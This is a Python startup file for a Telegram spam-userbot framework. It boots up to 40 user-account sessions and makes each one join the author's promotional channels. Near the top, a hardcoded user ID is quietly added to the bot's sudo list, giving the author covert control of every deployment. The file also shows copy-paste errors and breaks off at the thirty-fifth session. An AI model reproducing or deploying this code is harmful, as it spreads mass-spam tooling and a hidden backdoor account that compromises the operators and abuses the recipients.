#  - Spam Userbots
# Copyright © 2021 @DEADLY_SPAM_BOT

import os
import sys
import random
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from decouple import config
from os import getenv
import logging
import time
from telethon.tl.functions.messages import ImportChatInviteRequest


logging.basicConfig(format='[%(levelname) 5s/%(asctime)s] %(name)s: %(message)s',
                    level=logging.WARNING)

#version

deadlyversion = "v2.0.1"

#values
API_ID = config("API_ID", default=None, cast=int)
API_HASH = config("API_HASH", default=None)
ALIVE_PIC = config("ALIVE_PIC", default=None)
CMD_HNDLR = getenv("CMD_HNDLR", default=".")
HEROKU_APP_NAME = config("HEROKU_APP_NAME", None)
HEROKU_API_KEY = config("HEROKU_API_KEY", None)
STRING = config("STRING", default=None)
STRING2 = config("STRING2", default=None)
STRING3 = config("STRING3", default=None)
STRING4 = config("STRING4", default=None)
STRING5 = config("STRING5", default=None)
STRING6 = config("STRING6", default=None)
STRING7 = config("STRING7", default=None)
STRING8 = config("STRING8", default=None)
STRING9 = config("STRING9", default=None)
STRING10 = config("STRING10", default=None)
STRING11 = config("STRING11", default=None)
STRING12 = config("STRING12", default=None)
STRING13 = config("STRING13", default=None)
STRING14 = config("STRING14", default=None)
STRING15 = config("STRING15", default=None)
STRING16 = config("STRING16", default=None)
STRING17 = config("STRING17", default=None)
STRING18 = config("STRING18", default=None)
STRING19 = config("STRING19", default=None)
STRING20 = config("STRING20", default=None)
STRING21 = config("STRING21", default=None)
STRING22 = config("STRING22", default=None)
STRING23 = config("STRING23", default=None)
STRING24 = config("STRING24", default=None)
STRING25 = config("STRING25", default=None)
STRING26 = config("STRING26", default=None)
STRING27 = config("STRING27", default=None)
STRING28 = config("STRING28", default=None)
STRING29 = config("STRING29", default=None)
STRING30 = config("STRING30", default=None)
STRING31 = config("STRING31", default=None)
STRING32 = config("STRING32", default=None)
STRING33 = config("STRING33", default=None)
STRING34 = config("STRING34", default=None)
STRING35 = config("STRING35", default=None)
STRING36 = config("STRING36", default=None)
STRING37 = config("STRING37", default=None)
STRING38 = config("STRING38", default=None)
STRING39 = config("STRING39", default=None)
STRING40 = config("STRING40", default=None)
SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
if 1517994352 not in SUDO_USERS:
    SUDO_USERS.append(1517994352)
OWNER_ID = int(os.environ.get("OWNER_ID", None))

# Don't Mess with Codes !! 
DEV = list(map(int, getenv("FULLSUDO").split()))
DB_URI = config("DATABASE_URL", None)
DEV.append(OWNER_ID)
SUDO_USERS.append(OWNER_ID)

# Sessions
async def DEADLYSPAM():
    global SAM
    global SAM2
    global SAM3
    global SAM5
    global SAM4
    global SAM6
    global SAM7
    global SAM8
    global SAM9
    global SAM10
    global SAM11
    global SAM12
    global SAM13
    global SAM14
    global SAM15
    global SAM16
    global SAM17
    global SAM18
    global SAM19
    global SAM20
    global SAM21
    global SAM22
    global SAM23
    global SAM25
    global SAM24
    global SAM26
    global SAM27
    global SAM28
    global SAM29
    global SAM30
    global SAM31
    global SAM32
    global SAM33
    global SAM34
    global SAM35
    global SAM36
    global SAM37
    global SAM38
    global SAM39
    global SAM40
    
    if STRING:
        session_name = str(STRING)
        print("String 1 Found")
        SAM = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 1")
            await SAM.start()
            botme = await SAM.get_me()
            await SAM(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            SAM = "STRING"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = ""
        SAM = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM.start()
        except Exception as e:
            pass
   
    if STRING2:
        session_name = str(STRING2)
        print("String 2 Found")
        SAM2 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 2")
            await SAM2.start()
            await SAM2(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM2(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM2(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = ""
        SAM2 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM2.start()
        except Exception as e:
            pass

    if STRING3:
        session_name = str(STRING3)
        print("String 3 Found")
        SAM3 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 3")
            await  SAM3.start()
            await SAM3(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM3(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM3(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = ""
        SAM3 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM3.start()
        except Exception as e:
            pass

    if STRING4:
        session_name = str(STRING4)
        print("String 4 Found")
        SAM4 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 4")
            await SAM4.start()
            await SAM4(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM4(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM4(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = ""
        SAM4 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM4.start()
        except Exception as e:
            pass

    if STRING5:
        session_name = str(STRING5)
        print("String 5 Found")
        SAM5 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 5")
            await SAM5.start()
            await SAM5(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM5(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM5(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = ""
        SAM5 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM5.start()
        except Exception as e:
            pass
                  
    if STRING6:
        session_name = str(STRING6)
        print("String 6 Found")
        SAM6 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 6")
            await SAM6.start()
            await SAM6(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM6(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM6(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = ""
        SAM6 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM6.start()
        except Exception as e:
            pass

    if STRING7:
        session_name = str(STRING7)
        print("String 7 Found")
        SAM7 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 7")
            await SAM7.start()
            await SAM7(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM7(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM7(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = ""
        SAM7 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM7.start()
        except Exception as e:
            pass    
        
    
    if STRING8:
        session_name = str(STRING8)
        print("String 8 Found")
        SAM8 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 8")
            await SAM8.start()
            await SAM8(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM8(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM8(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = ""
        SAM8 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM8.start()
        except Exception as e:
            pass   
        
    if STRING9:
        session_name = str(STRING9)
        print("String 9 Found")
        SAM9 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 9")
            await SAM9.start()
            await SAM9(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM9(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM9(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = ""
        SAM9 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM9.start()
        except Exception as e:
            pass   
    
  
    if STRING10:
        session_name = str(STRING10)
        print("String 10 Found")
        SAM10 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 10")
            await SAM10.start()
            await SAM10(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM10(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM10(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = ""
        SAM10 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM10.start()
        except Exception as e:
            pass 
        
    
    if STRING11:
        session_name = str(STRING11)
        print("String 11 Found")
        SAM11 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 11")
            await SAM11.start()
            await SAM11(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM11(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM11(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM11.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 11 not Found")
        pass
        session_name = ""
        SAM11 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM11.start()
        except Exception as e:
            pass
        
    
    if STRING12:
        session_name = str(STRING12)
        print("String 12 Found")
        SAM12 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 12")
            await SAM12.start()
            await SAM12(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM12(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM12(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM12.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 12 not Found")
        pass
        session_name = ""
        SAM12 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM12.start()
        except Exception as e:
            pass   
    
  
    if STRING13:
        session_name = str(STRING13)
        print("String 13  Found")
        SAM13 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 13")
            await SAM13.start()
            await SAM13(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM13(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM13(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM13.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 13 not Found")
        pass
        session_name = ""
        SAM13 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM13.start()
        except Exception as e:
            pass 
        
    
    if STRING14:
        session_name = str(STRING14)
        print("String 14 Found")
        SAM14 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 14")
            await SAM14.start()
            await SAM14(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM14(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM14(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM14.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 14 not Found")
        pass
        session_name = ""
        SAM14 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM14.start()
        except Exception as e:
            pass
        
    
    if STRING15:
        session_name = str(STRING15)
        print("String 15 Found")
        SAM15 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 15")
            await SAM15.start()
            await SAM15(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM15(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM15(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM15.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 15 not Found")
        pass
        session_name = "DEADLYSPAM"
        SAM15 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM15.start()
        except Exception as e:
            pass


    if STRING16:
        session_name = str(STRING16)
        print("String 16 Found")
        SAM16 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 16")
            await SAM16.start()
            botme = await SAM16.get_me()
            await SAM16(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM16(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM16(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 16 not Found")
        session_name = ""
        SAM16 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM16.start()
        except Exception as e:
            pass
   
    if STRING17:
        session_name = str(STRING17)
        print("String 17 Found")
        SAM17 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 17")
            await SAM17.start()
            botme = await SAM17.get_me()
            await SAM17(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM17(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM17(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 17 not Found")
        session_name = ""
        SAM17 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM17.start()
        except Exception as e:
            pass
   
    if STRING18:
        session_name = str(STRING18)
        print("String 18 Found")
        SAM18 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await SAM18.start()
            botme = await SAM18.get_me()
            await SAM18(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM18(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM18(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 18 not Found")
        session_name = ""
        SAM18 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM18.start()
        except Exception as e:
            pass
   
    if STRING19:
        session_name = str(STRING19)
        print("String 19 Found")
        SAM19 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 19")
            await SAM19.start()
            botme = await SAM19.get_me()
            await SAM19(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM19(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM19(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 19 not Found")
        session_name = ""
        SAM19 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM.start()
        except Exception as e:
            pass
   
    if STRING20:
        session_name = str(STRING20)
        print("String 20 Found")
        SAM20 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 20")
            await SAM20.start()
            botme = await SAM20.get_me()
            await SAM20(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM20(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM20(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 20 not Found")
        session_name = ""
        SAM20 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM20.start()
        except Exception as e:
            pass

    if STRING21:
        session_name = str(STRING21)
        print("String 21 Found")
        SAM21 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 21")
            await SAM21.start()
            botme = await SAM21.get_me()
            await SAM21(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM21(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM21(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        session_name = ""
        SAM21 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM21.start()
        except Exception as e:
            pass
   
    if STRING22:
        session_name = str(STRING22)
        print("String 22 Found")
        SAM22 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await SAM22.start()
            await SAM22(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM22(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM22(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM22.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 22 not Found")
        pass
        session_name = ""
        SAM22 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM22.start()
        except Exception as e:
            pass

    if STRING23:
        session_name = str(STRING23)
        print("String 23 Found")
        SAM23 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 23")
            await  SAM23.start()
            await SAM23(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM23(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM23(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM23.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 23 not Found")
        pass
        session_name = ""
        SAM23 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM23.start()
        except Exception as e:
            pass

    if STRING24:
        session_name = str(STRING24)
        print("String 24 Found")
        SAM24 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 24")
            await SAM24.start()
            await SAM24(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM24(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM24(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM24.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 24 not Found")
        pass
        session_name = ""
        SAM24 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM24.start()
        except Exception as e:
            pass

    if STRING25:
        session_name = str(STRING25)
        print("String 25 Found")
        SAM25 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await SAM25.start()
            await SAM25(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM25(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM25(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM25.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 25 not Found")
        pass
        session_name = ""
        SAM25 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM25.start()
        except Exception as e:
            pass
                  
    if STRING26:
        session_name = str(STRING26)
        print("String 36 Found")
        SAM26 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 26")
            await SAM26.start()
            await SAM26(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM26(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM26(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM26.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 26 not Found")
        pass
        session_name = ""
        SAM26 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM26.start()
        except Exception as e:
            pass

    if STRING27:
        session_name = str(STRING27)
        print("String 27 Found")
        SAM27 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 27")
            await SAM27.start()
            await SAM27(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM27(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM27(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM27.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 27 not Found")
        pass
        session_name = ""
        SAM27 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM27.start()
        except Exception as e:
            pass    
        
    
    if STRING28:
        session_name = str(STRING28)
        print("String 28 Found")
        SAM28 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 18")
            await SAM28.start()
            await SAM28(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM28(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM28(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM28.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 28 not Found")
        pass
        session_name = ""
        SAM28 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM28.start()
        except Exception as e:
            pass   
        
    if STRING29:
        session_name = str(STRING29)
        print("String 29 Found")
        SAM29 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 29")
            await SAM29.start()
            await SAM29(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM29(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM29(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM29.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 29 not Found")
        pass
        session_name = ""
        SAM29 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM29.start()
        except Exception as e:
            pass   
    
  
    if STRING30:
        session_name = str(STRING30)
        print("String 30 Found")
        SAM30 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 30")
            await SAM30.start()
            await SAM30(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM30(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM30(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM30.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 30 not Found")
        pass
        session_name = ""
        SAM30 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM30.start()
        except Exception as e:
            pass 
        
    
    if STRING31:
        session_name = str(STRING31)
        print("String 31 Found")
        SAM31 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 31")
            await SAM31.start()
            await SAM31(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM31(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM31(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM31.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 31 not Found")
        pass
        session_name = ""
        SAM31 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM31.start()
        except Exception as e:
            pass
        
    
    if STRING32:
        session_name = str(STRING32)
        print("String 32 Found")
        SAM32 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 32")
            await SAM32.start()
            await SAM32(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM32(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM32(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM32.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 32 not Found")
        pass
        session_name = ""
        SAM32 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM32.start()
        except Exception as e:
            pass   
    
  
    if STRING33:
        session_name = str(STRING33)
        print("String 33  Found")
        SAM33 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 33")
            await SAM33.start()
            await SAM33(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM33(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM33(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM33.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 33 not Found")
        pass
        session_name = ""
        SAM33 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM33.start()
        except Exception as e:
            pass 
        
    
    if STRING34:
        session_name = str(STRING34)
        print("String 34 Found")
        SAM34 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 34")
            await SAM34.start()
            await SAM34(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM34(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM34(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM34.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 34 not Found")
        pass
        session_name = ""
        SAM34 = TelegramClient(session_name, API_ID, API_HASH)
        try:
            await SAM34.start()
        except Exception as e:
            pass
        
    
    if STRING35:
        session_name = str(STRING35)
        print("String 35 Found")
        SAM35 = TelegramClient(StringSession(session_name), API_ID, API_HASH)
        try:
            print("Booting Up The Client 35")
            await SAM35.start()
            await SAM35(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAM_BOT"))
            await SAM35(functions.channels.JoinChannelRequest(channel="@DEADLY_SPAMMER"))
            await SAM35(functions.channels.JoinChannelRequest(channel="@DEADLY_FIGHTERS"))
            botme = await SAM35.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SUDO_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 35 not Found")
